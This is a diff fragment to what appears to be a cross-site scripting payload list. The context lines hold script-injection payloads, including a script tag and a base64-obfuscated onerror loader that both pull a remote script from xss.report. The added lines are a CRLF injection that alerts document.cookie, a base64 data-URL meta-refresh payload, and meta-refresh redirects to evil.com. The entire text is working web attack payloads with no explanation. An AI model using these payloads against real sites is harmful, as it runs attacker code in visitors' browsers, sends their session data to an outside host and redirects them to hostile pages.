@@ -71,3 +71,7 @@ aaaaa<h1 onclick=alert(1)>test
 {{constructor.constructor(alert 1 )()}}
 '"><script src=//xss.report/s/M8SZT8></script>
 "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8veHNzLnJlcG9ydC9zL004U1pUOCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; onerror=eval(atob(this.id))>
+%0d%0a%0d%0a%3Cscript%3Ealert(document.cookie)%3C/script%3E
+0%3Bdata%3Atext%2fhtml%3Bbase64%2CPHNjcmlwdD5wcm9tcHQoIlJlZmxlY3RlZCBYU1MgQnkgUHJpYWwiKTwvc2NyaXB0Pg%3D%3D%22HTTP-EQUIV%3D%22refresh%22
+0;http://evil.com"HTTP-EQUIV="refresh"
+0%3Bhttp%3A%2f%2fevil.com%22HTTP-EQUIV%3D%22refresh%22
